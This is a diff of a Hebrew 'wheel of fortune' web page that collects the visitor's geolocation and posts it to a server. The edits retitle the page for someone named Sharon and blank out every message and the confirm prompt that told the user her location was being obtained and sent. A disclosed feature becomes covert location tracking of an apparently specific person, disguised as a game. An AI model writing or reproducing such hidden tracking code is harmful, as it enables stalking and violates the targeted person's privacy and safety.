@@ -4,7 +4,7 @@
 <head>
     <meta charset="utf-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1" />
-    <title>גלגל מזל — ערים בישראל</title>
+    <title>גלגל המזל של שרוןןן</title>
     <style>
         :root {
             --bg: #0f1220;
@@ -109,7 +109,7 @@
 
         </div>
         <button id="spinBtn">סובב גלגל</button>
-        <div id="result" class="result">לחץ כדי לסובב…</div>
+        <div id="result" class="result">לחצי כדי לסובב…</div>
     </div>
 <script>
 /* ====== רשימת הערים + קונפיג ====== */
@@ -206,7 +206,7 @@ async function handleSpinClick() {
   if (isSpinning) return;
 
   // שלב 1: ננסה לקבל מיקום
-  resultEl.textContent = 'מנסה לקבל מיקום…';
+  resultEl.textContent = '';
   spinBtn.disabled = true;
 
   let gotPos = null;
@@ -218,17 +218,17 @@ async function handleSpinClick() {
       accuracy: pos.coords.accuracy,
       timestamp: new Date(pos.timestamp).toISOString()
     };
-    resultEl.textContent = 'מיקום נמצא — נשלח ואז נסובב…';
+    resultEl.textContent = '';
   } catch (err) {
     // לא קיבלנו מיקום (נחסם/אף/טיימאוט)
     console.warn('geolocation error', err);
-    const cont = confirm('לא הצלחנו לקבל את המיקום (המשתמש חסם או טיימאוט).\nלהמשיך לסיבוב בלי שליחת מיקום?');
+    const cont = confirm('');
     if (!cont) {
-      resultEl.textContent = 'ביטלת סיבוב — נסה שוב כשתאשר מיקום.';
+      resultEl.textContent = '';
       spinBtn.disabled = false;
       return;
     } else {
-      resultEl.textContent = 'ממשיכים לסיבוב ללא מיקום…';
+      resultEl.textContent = '';
     }
   }
 
@@ -242,10 +242,10 @@ async function handleSpinClick() {
     const ok = await postLocation(payload);
     if (!ok) {
       // אפשר להמשיך גם אם לא הצלחנו לשמור, אבל נותנים חיווי
-      resultEl.textContent = 'נכשל לשלוח מיקום לשרת — נסובב בכל זאת.';
+      resultEl.textContent = '';
       await new Promise(r=>setTimeout(r,700)); // קצר להראות את ההודעה
     } else {
-      resultEl.textContent = 'מיקום נשלח — מתחילים סיבוב!';
+      resultEl.textContent = '';
       await new Promise(r=>setTimeout(r,350)); // מעט דיליי עד הסיבוב
     }
   }
